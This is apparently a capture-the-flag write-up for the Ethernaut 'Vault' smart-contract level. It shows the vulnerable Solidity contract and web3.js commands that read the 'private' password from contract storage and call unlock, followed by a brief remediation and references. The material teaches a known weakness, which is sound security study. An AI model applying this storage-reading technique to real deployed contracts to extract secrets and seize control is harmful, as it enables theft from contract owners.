![Vault](/assets/img/BigLevel8.svg)

- [Challenge](#challenge)
- [Solution](#solution)
- [Remediation](#remediation)
- [References](#references)
   
# Challenge

The level states:

> Unlock the vault to pass the level!

And gives us the following code:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Vault {
  bool public locked;
  bytes32 private password;

  constructor(bytes32 _password) {
    locked = true;
    password = _password;
  }

  function unlock(bytes32 _password) public {
    if (password == _password) {
      locked = false;
    }
  }
}
```

# Solution

For this level, we have to unlock the vault. The variable `locked` is set to `true` at the constructor. To change it to `false` (to win the level) we have to "guess" the `password` (that was also set in the constructor).

The `password` variable is declared `private`. But, what is a private variable?

> Private state variables are like internal ones but they are not visible in derived contracts.
>
> *Warning: Making something private or internal only prevents other contracts from reading or modifying the information, but it will still be visible to the whole world outside of the blockchain.*

Also, as we know, the blockchain is public! So we should be able to read that variable if it's stored on the net.

We can use [etherscan](https://sepolia.etherscan.io/) to inspect addresses, transactions, blocks tokens.
We can get the contract's address by executing `contract.address`. Then paste that address into etherscan's search.

![Etherscan Contract Address](/assets/img/vault_etherscan_contract.png)

From there we can inspect the transaction (in this case the transaction that created the contract), and see the changes in the storage of the contract:

![Etherscan Contract Address](/assets/img/vault_etherscan_contract_storage.png)

Another way to inspect the contract storage is by using web3.js utils `await web3.eth.getStorageAt(contract.address, 0)`. That will give us the content of the storage at the slot 0. In this case, the value of the `locked` variable:

```javascript
await web3.eth.getStorageAt(contract.address, 0)
'0x0000000000000000000000000000000000000000000000000000000000000001'
```

Which is true. And to get the content of the `password` variable, we just need to call:

```javascript
web3.utils.toAscii(await web3.eth.getStorageAt(contract.address, 1))
'A very strong secret password :)'
```
So, now that we know the "secret" password, we can call unlock with its value:

```javascript
await contract.unlock(await web3.eth.getStorageAt(contract.address, 1))
```

And now we can verify that the contract isn't locked anymore:

```javascript
await contract.locked()
false
```

Now that we have unlocked the contract we can submit the level, and that's it! We passed the level :D

![Well done](/assets/img/ethernaut_solved.png)

# Remediation

- Any private data should either be stored off-chain, or carefully encrypted.

# References

- [SWC-136](https://swcregistry.io/docs/SWC-136)
- [Contracts](https://docs.soliditylang.org/en/v0.8.17/contracts.html)